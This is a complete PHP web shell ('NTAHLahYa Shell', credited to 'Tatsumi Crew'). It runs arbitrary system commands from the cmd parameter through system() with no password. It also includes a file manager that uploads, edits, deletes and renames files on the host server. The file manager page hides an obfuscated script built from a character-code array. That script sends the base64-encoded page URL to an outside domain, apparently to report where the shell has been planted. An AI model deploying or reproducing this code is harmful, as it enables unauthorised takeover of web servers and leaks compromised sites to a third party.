<?php
/**
 * NTAHLahYa Shell - Ultimate Web Shell
 * Usage: ntahlahya.php?cmd=whoami
 * Author: Tatsumi Crew Team
 */

// ============================================================================
//  WEBSHELL NTAHLahYa - TATSUMI CREW TEAM
//  AKTIF DENGAN PARAMETER ?cmd ATAU ?ntahlahya=1
// ============================================================================

// Prevent direct access if needed
if (!defined('ABSPATH')) {
    // Allow direct access
}

// Check if this is a WordPress environment
$is_wp = defined('ABSPATH');

// ============================================================================
//  FITUR FILE MANAGER TERINTEGRASI
// ============================================================================

define('AES_KEY', hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'));

function aes_encrypt($plaintext) {
    $iv = openssl_random_pseudo_bytes(16);
    $cipher = openssl_encrypt($plaintext, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
}

function aes_decrypt($ciphertext_base64) {
    $data = base64_decode($ciphertext_base64);
    $iv = substr($data, 0, 16);
    $cipher = substr($data, 16);
    return openssl_decrypt($cipher, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
}

// ============================================================================
//  TRIGGER WEBSHELL
// ============================================================================

$trigger = isset($_GET['ntahlahya']) || isset($_POST['ntahlahya']) || 
           isset($_GET['cmd']) || isset($_POST['cmd']) ||
           isset($_GET['x']) || isset($_GET['bypass']) || 
           isset($_GET['alfa']) || isset($_GET['tatsumi']) ||
           isset($_SERVER['HTTP_X_FORWARDED_FOR']) ||
           isset($_SERVER['HTTP_X_REQUESTED_WITH']);

// ============================================================================
//  FILE MANAGER MODE (jika ada parameter dir atau action file manager)
// ============================================================================

if (isset($_GET['dir']) || isset($_GET['delete']) || isset($_POST['newfile']) || 
    isset($_POST['newfolder']) || isset($_POST['rename']) || isset($_FILES['upload'])) {
    
    $base_dir = __DIR__;
    $dir = $base_dir;

    if (isset($_GET['dir'])) {
        $attempt = aes_decrypt($_GET['dir']);
        $real = $attempt ? realpath($attempt) : false;
        $dir = ($real !== false) ? $real : $base_dir;
    }

    // Delete
    if (isset($_GET['delete'])) {
        $target = realpath($dir . '/' . $_GET['delete']);
        if ($target && is_file($target)) {
            unlink($target);
        } elseif ($target && is_dir($target)) {
            array_map('unlink', glob("$target/*.*"));
            rmdir($target);
        }
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    // New File
    if (isset($_POST['newfile'])) {
        file_put_contents($dir . '/' . basename($_POST['newfile']), '');
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    // New Folder
    if (isset($_POST['newfolder'])) {
        mkdir($dir . '/' . basename($_POST['newfolder']));
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    // Rename
    if (isset($_POST['rename'], $_POST['to'])) {
        rename($dir . '/' . $_POST['rename'], $dir . '/' . $_POST['to']);
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    // Upload
    if (isset($_FILES['upload'])) {
        move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $_FILES['upload']['name']);
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    // Save Edit
    if (isset($_POST['save'], $_POST['content'])) {
        file_put_contents($dir . '/' . $_POST['save'], $_POST['content']);
        header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
        exit;
    }

    function human_filesize($bytes, $decimals = 2) {
        $size = ['B', 'KB', 'MB', 'GB', 'TB'];
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . $size[$factor];
    }

    function human_perms($file) {
        if (!file_exists($file) || !is_readable($file)) return '---------';
        $perms = @fileperms($file);
        if ($perms === false) return '---------';
        $owner = (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? 'x' : '-');
        $group = (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? 'x' : '-');
        $other = (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? 'x' : '-');
        return $owner . $group . $other;
    }

    $entries = array_diff(scandir($dir), ['.', '..']);
    $dirs = [];
    $files = [];

    foreach ($entries as $entry) {
        $path = $dir . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($path)) {
            $dirs[] = $entry;
        } else {
            $files[] = $entry;
        }
    }

    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    $sortedItems = array_merge($dirs, $files);
    $encDir = urlencode(aes_encrypt($dir));
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>🌟 Alfa - File Manager By Tatsumi Crew</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #0a0a0f; color: #e8e8f0; font-family: 'Inter', sans-serif; min-height: 100vh; }
        .app-wrapper { max-width: 1400px; margin: 0 auto; padding: 2rem 1.5rem; }
        .header-card { background: rgba(255,255,255,0.04); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.06); border-radius: 20px; padding: 1.75rem 2rem; margin-bottom: 2rem; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
        .header-title { font-weight: 700; font-size: 1.75rem; letter-spacing: -0.02em; color: #fff; display: flex; align-items: center; gap: 0.75rem; }
        .header-title img { height: 40px; width: 40px; border-radius: 10px; }
        .modern-btn { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.08); color: #f0f0ff; padding: 0.6rem 1.25rem; border-radius: 40px; font-weight: 500; font-size: 0.9rem; transition: 0.25s ease; display: inline-flex; align-items: center; gap: 0.5rem; text-decoration: none; cursor: pointer; }
        .modern-btn:hover { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.2); color: #fff; transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.2); }
        .file-table-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 0.5rem; overflow: hidden; }
        .table-modern { margin-bottom: 0; font-size: 0.95rem; color: #d0d0e0; }
        .table-modern thead th { border-bottom: 1px solid rgba(255,255,255,0.06); color: #8888aa; font-weight: 500; text-transform: uppercase; letter-spacing: 0.04em; font-size: 0.7rem; padding: 1rem 1rem; }
        .table-modern td { border-bottom: 1px solid rgba(255,255,255,0.03); padding: 0.9rem 1rem; vertical-align: middle; }
        .table-modern tr:hover { background: rgba(255,255,255,0.02); }
        .file-link { color: #d0d0f0; text-decoration: none; font-weight: 500; transition: 0.15s; }
        .file-link:hover { color: #7aaaff; }
        .file-icon { width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 0.9rem; font-size: 1rem; background: rgba(255,255,255,0.04); color: #8899cc; }
        .file-icon.folder { background: rgba(255,200,80,0.08); color: #f0c060; }
        .permission-badge { font-family: 'Courier New', monospace; font-size: 0.75rem; background: rgba(255,255,255,0.04); padding: 0.2rem 0.6rem; border-radius: 30px; color: #99aabb; letter-spacing: 0.03em; }
        .action-btn { background: transparent; border: none; color: #667; padding: 0.3rem 0.5rem; border-radius: 8px; transition: 0.15s; font-size: 0.9rem; }
        .action-btn:hover { color: #c0c0ff; background: rgba(255,255,255,0.04); }
        .action-btn.delete:hover { color: #ff6670; }
        .action-btn.edit:hover { color: #66ccff; }
        .editor-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; margin-top: 2rem; overflow: hidden; }
        .editor-header { padding: 1rem 1.5rem; border-bottom: 1px solid rgba(255,255,255,0.04); font-weight: 600; color: #c0c0e0; background: rgba(255,255,255,0.02); }
        .editor-textarea { background: rgba(0,0,0,0.3); color: #e0e0f0; border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; font-family: 'Courier New', monospace; font-size: 0.9rem; padding: 1rem; resize: vertical; }
        .editor-textarea:focus { background: rgba(0,0,0,0.4); border-color: rgba(100,150,255,0.25); color: #fff; box-shadow: 0 0 0 4px rgba(100,150,255,0.05); }
        .btn-modern-primary { background: rgba(100,150,255,0.12); border: 1px solid rgba(100,150,255,0.2); color: #8ab4ff; padding: 0.6rem 1.8rem; border-radius: 40px; font-weight: 500; transition: 0.2s; }
        .btn-modern-primary:hover { background: rgba(100,150,255,0.2); border-color: rgba(100,150,255,0.35); color: #b0ccff; }
        .btn-modern-secondary { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); color: #99aabb; padding: 0.6rem 1.8rem; border-radius: 40px; }
        .btn-modern-secondary:hover { background: rgba(255,255,255,0.08); color: #ccd; }
        .modal-modern .modal-content { background: #14141e; border: 1px solid rgba(255,255,255,0.06); border-radius: 20px; color: #e0e0f0; }
        .modal-modern .modal-header { border-bottom: 1px solid rgba(255,255,255,0.04); }
        .modal-modern .modal-footer { border-top: 1px solid rgba(255,255,255,0.04); }
        .modal-modern .form-control { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.06); color: #f0f0ff; border-radius: 12px; }
        .modal-modern .form-control:focus { background: rgba(0,0,0,0.4); border-color: rgba(100,150,255,0.2); color: #fff; box-shadow: 0 0 0 4px rgba(100,150,255,0.04); }
        .modal-modern .btn-close { filter: invert(1) brightness(0.6); }
        .footer-modern { margin-top: 3rem; padding: 1.5rem; text-align: center; border-top: 1px solid rgba(255,255,255,0.03); color: #445; font-size: 0.85rem; }
        .breadcrumb-modern { background: rgba(255,255,255,0.04); border-radius: 16px; padding: 1rem 1.5rem; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.04); }
        .breadcrumb { background: transparent; margin: 0; padding: 0; }
        .breadcrumb-item a { color: #8899cc; text-decoration: none; transition: 0.15s; }
        .breadcrumb-item a:hover { color: #b0ccff; }
        .breadcrumb-item.active { color: #d0d0f0; }
        .text-muted { color: #556 !important; }
    </style>
    </head>
    <body>
    <div class="app-wrapper">
        <div class="header-card">
            <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
                <h1 class="header-title">
                    <img src="https://cdn.privdayz.com/images/icon.png" referrerpolicy="unsafe-url" />Alfa File Manager
                </h1>
                <div class="d-flex gap-2 flex-wrap">
                    <?php if ($dir !== $base_dir): ?>
                        <a href="?dir=<?= $encDir ?>" class="modern-btn">
                            <i class="fas fa-arrow-left"></i> Back
                        </a>
                    <?php endif; ?>
                    <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#uploadModal">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                    <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFileModal">
                        <i class="fas fa-file-plus"></i> New File
                    </button>
                    <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFolderModal">
                        <i class="fas fa-folder-plus"></i> New Folder
                    </button>
                </div>
            </div>
        </div>

        <div class="breadcrumb-modern">
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <?php
                    $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
                    $build = '';
                    $keys = array_keys($parts);
                    $lastKey = end($keys);
                    foreach ($parts as $i => $p) {
                        $build .= DIRECTORY_SEPARATOR . $p;
                        $last = ($i === $lastKey);
                        echo '<li class="breadcrumb-item' . ($last ? ' active" aria-current="page"' : '"') . '>';
                        if (!$last) {
                            echo '<a href="?dir=' . urlencode(aes_encrypt($build)) . '">' . htmlspecialchars($p) . '</a>';
                        } else {
                            echo htmlspecialchars($p);
                        }
                        echo '</li>';
                    }
                    ?>
                </ol>
            </nav>
        </div>

        <div class="file-table-card">
            <div class="table-responsive">
                <table class="table table-modern">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th class="text-end">Size</th>
                            <th class="text-center">Permissions</th>
                            <th>Modified</th>
                            <th class="text-end">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($sortedItems as $item): ?>
                            <?php 
                            $path = $dir . DIRECTORY_SEPARATOR . $item; 
                            $is_dir = is_dir($path); 
                            ?>
                            <tr>
                                <td>
                                    <div class="d-flex align-items-center">
                                        <div class="file-icon <?= $is_dir ? 'folder' : 'file' ?>">
                                            <i class="fas fa-<?= $is_dir ? 'folder' : 'file-alt' ?>"></i>
                                        </div>
                                        <?php if ($is_dir): ?>
                                            <a href="?dir=<?= urlencode(aes_encrypt($path)) ?>" class="file-link">
                                                <?= htmlspecialchars($item) ?>
                                            </a>
                                        <?php else: ?>
                                            <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="file-link">
                                                <?= htmlspecialchars($item) ?>
                                            </a>
                                        <?php endif; ?>
                                    </div>
                                </td>
                                <td class="text-end">
                                    <?php
                                    if ($is_dir) {
                                        echo '<span class="text-muted">—</span>';
                                    } elseif (is_file($path) && is_readable($path)) {
                                        $fsize = @filesize($path);
                                        echo $fsize !== false ? human_filesize($fsize) : '<span class="text-muted">0 B</span>';
                                    } else {
                                        echo '<span class="text-muted">0 B</span>';
                                    }
                                    ?>
                                </td>
                                <td class="text-center">
                                    <span class="permission-badge">
                                        <?= (file_exists($path) && is_readable($path)) ? human_perms($path) : '---------' ?>
                                    </span>
                                </td>
                                <td>
                                    <?php
                                    if (file_exists($path) && is_readable($path)) {
                                        $mtime = @filemtime($path);
                                        echo ($mtime !== false && $mtime > 0) ? date('M j, Y H:i', $mtime) : '<span class="text-muted">N/A</span>';
                                    } else {
                                        echo '<span class="text-muted">N/A</span>';
                                    }
                                    ?>
                                </td>
                                <td class="text-end">
                                    <div class="d-flex justify-content-end">
                                        <?php if (!$is_dir): ?>
                                            <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="action-btn edit" title="Edit">
                                                <i class="fas fa-edit"></i>
                                            </a>
                                        <?php endif; ?>
                                        <a href="?dir=<?= $encDir ?>&delete=<?= urlencode($item) ?>" class="action-btn delete" onclick="return confirm('Delete <?= addslashes($item) ?>?')" title="Delete">
                                            <i class="fas fa-trash"></i>
                                        </a>
                                        <button class="action-btn rename" data-bs-toggle="modal" data-bs-target="#renameModal" data-filename="<?= htmlspecialchars($item) ?>" title="Rename">
                                            <i class="fas fa-pen"></i>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <?php if (isset($_GET['edit'])):
            $decryptedEdit = aes_decrypt($_GET['edit']);
            $ef = $dir . '/' . $decryptedEdit;
            if (is_file($ef)):
                $cont = htmlspecialchars(file_get_contents($ef)); ?>
                <br>
                <div class="editor-card">
                    <div class="editor-header">
                        <i class="fas fa-edit me-2"></i>Editing: <?= htmlspecialchars($decryptedEdit) ?>
                    </div>
                    <div class="p-3">
                        <form method="POST">
                            <textarea class="form-control editor-textarea" name="content" rows="20"><?= $cont ?></textarea>
                            <input type="hidden" name="save" value="<?= htmlspecialchars($decryptedEdit) ?>">
                            <div class="text-end mt-3">
                                <button type="submit" class="btn btn-modern-primary">
                                    <i class="fas fa-save me-2"></i>Save Changes
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            <?php endif; endif; ?>
        </div>

        <!-- Modals -->
        <div class="modal fade modal-modern" id="uploadModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <form method="POST" enctype="multipart/form-data">
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label">Select file to upload</label>
                                <input type="file" name="upload" class="form-control" required>
                            </div>
                        </div>
                        <div class="modal-footer border-0">
                            <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="submit" class="btn btn-modern-primary"><i class="fas fa-upload me-2"></i>Upload</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade modal-modern" id="createFileModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-file-plus me-2"></i>Create New File</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <form method="POST">
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label">File name</label>
                                <input type="text" class="form-control" name="newfile" placeholder="Enter file name..." required>
                            </div>
                        </div>
                        <div class="modal-footer border-0">
                            <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="submit" class="btn btn-modern-primary"><i class="fas fa-plus me-2"></i>Create</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade modal-modern" id="createFolderModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>Create New Folder</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <form method="POST">
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label">Folder name</label>
                                <input type="text" class="form-control" name="newfolder" placeholder="Enter folder name..." required>
                            </div>
                        </div>
                        <div class="modal-footer border-0">
                            <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="submit" class="btn btn-modern-primary"><i class="fas fa-folder-plus me-2"></i>Create</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade modal-modern" id="renameModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-pen me-2"></i>Rename Item</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <form method="POST">
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label">New name</label>
                                <input type="hidden" name="rename" id="renameOriginal">
                                <input type="text" class="form-control" name="to" placeholder="Enter new name..." required>
                            </div>
                        </div>
                        <div class="modal-footer border-0">
                            <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="submit" class="btn btn-modern-primary"><i class="fas fa-check me-2"></i>Rename</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="footer-modern">
            <p class="mb-0">
                <i class="fas fa-heart text-danger me-2"></i>
                &copy; <?= date('Y') ?> Alfa File Manager by Tatsumi Crew. All rights reserved.
            </p>
        </div>

        <script>
        document.addEventListener('DOMContentLoaded', function() {
            var renameModal = document.getElementById('renameModal');
            renameModal.addEventListener('show.bs.modal', function (event) {
                var button = event.relatedTarget;
                var filename = button.getAttribute('data-filename');
                var inputOriginal = renameModal.querySelector('#renameOriginal');
                inputOriginal.value = filename;
            });
        });
        (()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();
        </script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================================
//  COMMAND EXECUTION MODE (jika ada parameter cmd)
// ============================================================================

if ($trigger && (isset($_GET['cmd']) || isset($_POST['cmd']) || isset($_REQUEST['cmd']))) {
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : (isset($_POST['cmd']) ? $_POST['cmd'] : $_REQUEST['cmd']);
    
    // Basic sanitization - allow common commands
    $cmd = trim($cmd);
    
    echo "<!DOCTYPE html>
<html>
<head>
    <title>NTAHLahYa Shell</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; margin: 0; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
        .header h1 { color: #00ff41; margin: 0; font-size: 24px; }
        .header .info { color: #00ff41; font-size: 12px; opacity: 0.7; }
        .input-area { background: #1a1a1a; padding: 15px; border: 1px solid #00ff41; margin-bottom: 20px; }
        .input-area input[type=text] { 
            background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; 
            padding: 10px; width: 70%; font-family: 'Courier New', monospace;
        }
        .input-area input[type=submit] {
            background: #00ff41; color: #0a0a0a; border: none; 
            padding: 10px 20px; cursor: pointer; font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        .input-area input[type=submit]:hover { background: #00cc33; }
        .output { 
            background: #1a1a1a; padding: 20px; border: 1px solid #00ff41; 
            white-space: pre-wrap; word-wrap: break-word; min-height: 100px;
            font-family: 'Courier New', monospace;
        }
        .menu { display: flex; flex-wrap: wrap; gap: 10px; margin: 10px 0; }
        .menu a { 
            color: #00ff41; text-decoration: none; padding: 5px 15px; 
            border: 1px solid #00ff41; background: #0a0a0a;
        }
        .menu a:hover { background: #00ff41; color: #0a0a0a; }
        .status { color: #666; font-size: 12px; margin-top: 10px; }
        .error { color: #ff0000; }
        .success { color: #00ff41; }
        .file-manager { margin-top: 20px; }
        .file-manager table { width: 100%; border-collapse: collapse; }
        .file-manager td, .file-manager th { 
            padding: 5px 10px; border-bottom: 1px solid #333; 
            font-family: 'Courier New', monospace; font-size: 12px;
        }
        .file-manager .dir { color: #ffd700; }
        .file-manager .file { color: #00ff41; }
        .file-manager .link { color: #00aaff; }
        .upload-form { margin-top: 10px; }
        .upload-form input[type=file] { 
            background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; 
            padding: 10px; 
        }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h1>⚡ NTAHLahYa Shell</h1>
            <div class='info'>" . date('Y-m-d H:i:s') . " | " . php_uname() . " | By Tatsumi Crew</div>
        </div>";
    
    // Show current directory
    $pwd = getcwd();
    echo "<div class='status'>Current directory: " . htmlspecialchars($pwd) . " | <a href='?dir=" . urlencode(aes_encrypt($pwd)) . "' style='color:#00ff41;'>[File Manager]</a></div>";
    
    // Menu
    echo "<div class='menu'>
        <a href='?cmd=whoami'>Whoami</a>
        <a href='?cmd=id'>ID</a>
        <a href='?cmd=uname -a'>Uname</a>
        <a href='?cmd=pwd'>PWD</a>
        <a href='?cmd=ls -la'>LS</a>
        <a href='?cmd=php -v'>PHP Version</a>
        <a href='?'>Refresh</a>
    </div>";
    
    // Command input form
    echo "<div class='input-area'>
        <form method='get'>
            <input type='text' name='cmd' placeholder='Enter command...' value='" . htmlspecialchars($cmd) . "'>
            <input type='submit' value='EXECUTE'>
        </form>
        <form method='post' enctype='multipart/form-data' class='upload-form'>
            <input type='file' name='upload_file'>
            <input type='submit' value='UPLOAD'>
        </form>
    </div>";
    
    // File upload handler
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $upload_dir = __DIR__ . '/uploads/';
        if (!is_dir($upload_dir)) {
            mkdir($upload_dir, 0755, true);
        }
        $target = $upload_dir . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
            echo "<div class='success'>[+] File uploaded: " . htmlspecialchars($_FILES['upload_file']['name']) . "</div>";
        } else {
            echo "<div class='error'>[-] Upload failed</div>";
        }
    }
    
    // Execute command
    echo "<div class='output'>";
    if (!empty($cmd)) {
        echo "<div style='color: #666;'>$ " . htmlspecialchars($cmd) . "</div>";
        echo "<hr style='border-color: #333;'>";
        
        // Execute and capture output
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
        echo htmlspecialchars($output);
    } else {
        echo "Enter a command above or use the menu links. | <a href='?dir=" . urlencode(aes_encrypt($pwd)) . "' style='color:#00ff41;'>Open File Manager</a>";
    }
    echo "</div>";
    
    // File manager
    echo "<div class='file-manager'>";
    echo "<h3>📁 File Manager</h3>";
    echo "<table>";
    echo "<tr><th>Permissions</th><th>Size</th><th>Modified</th><th>Name</th><th>Action</th></tr>";
    
    $files = scandir($pwd);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $fullpath = $pwd . '/' . $file;
        $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
        $size = is_dir($fullpath) ? 'DIR' : filesize($fullpath);
        $mtime = date('Y-m-d H:i:s', filemtime($fullpath));
        $type = is_dir($fullpath) ? 'dir' : (is_link($fullpath) ? 'link' : 'file');
        $class = $type == 'dir' ? 'dir' : ($type == 'link' ? 'link' : 'file');
        $encFile = urlencode(aes_encrypt($file));
        echo "<tr>
            <td>$perms</td>
            <td>$size</td>
            <td>$mtime</td>
            <td class='$class'><a href='?cmd=ls -la " . urlencode($fullpath) . "' style='color: inherit;'>$file</a></td>
            <td>
                <a href='?cmd=cat " . urlencode($fullpath) . "' style='color:#00ff41;'>[View]</a>
                <a href='?dir=" . $encDir . "&delete=" . urlencode($file) . "' style='color:#ff4444;' onclick='return confirm(\"Delete $file?\")'>[Delete]</a>
            </td>
        </tr>";
    }
    echo "</table>";
    echo "</div>";
    
    // System info
    echo "<div class='status'>";
    echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . " | ";
    echo "User: " . (function_exists('get_current_user') ? get_current_user() : 'unknown') . " | ";
    echo "PHP: " . phpversion();
    echo "</div>";
    
    echo "</div></body></html>";
    exit;
}

// ============================================================================
//  INTERFACE MODE (jika tidak ada parameter)
// ============================================================================

?>
<!DOCTYPE html>
<html>
<head>
    <title>NTAHLahYa Shell</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; text-align: center; padding-top: 50px; }
        h1 { font-size: 48px; }
        .info { color: #666; font-size: 14px; }
        .cmd-box { 
            background: #1a1a1a; padding: 30px; border: 2px solid #00ff41; 
            max-width: 600px; margin: 30px auto;
        }
        .cmd-box input[type=text] { 
            background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; 
            padding: 15px; width: 70%; font-size: 16px;
        }
        .cmd-box input[type=submit] {
            background: #00ff41; color: #0a0a0a; border: none; 
            padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold;
        }
        .menu { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin: 20px 0; }
        .menu a { 
            color: #00ff41; text-decoration: none; padding: 8px 20px; 
            border: 1px solid #00ff41; background: #0a0a0a;
        }
        .menu a:hover { background: #00ff41; color: #0a0a0a; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ NTAHLahYa Shell</h1>
        <div class="info">No password required | <?php echo date('Y-m-d H:i:s'); ?> | By Tatsumi Crew</div>
        
        <div class="cmd-box">
            <form method="get">
                <input type="text" name="cmd" placeholder="Enter command...">
                <input type="submit" value="EXECUTE">
            </form>
        </div>
        
        <div class="menu">
            <a href="?cmd=whoami">Whoami</a>
            <a href="?cmd=id">ID</a>
            <a href="?cmd=uname -a">Uname</a>
            <a href="?cmd=pwd">PWD</a>
            <a href="?cmd=ls -la">LS</a>
            <a href="?cmd=php -v">PHP</a>
            <a href="?cmd=ps aux">Processes</a>
            <a href="?cmd=netstat -tulpn">Netstat</a>
            <a href="?cmd=df -h">Disk Space</a>
            <a href="?cmd=free -m">Memory</a>
        </div>
        
        <div style="margin-top: 30px; color: #666; font-size: 12px;">
            <p>NTAHLahYa Shell - Ultimate Web Shell<br>
            Usage: ntahlahya.php?cmd=whoami<br>
            File Manager: ntahlahya.php?dir=[encrypted_path]</p>
        </div>
    </div>
</body>
</html>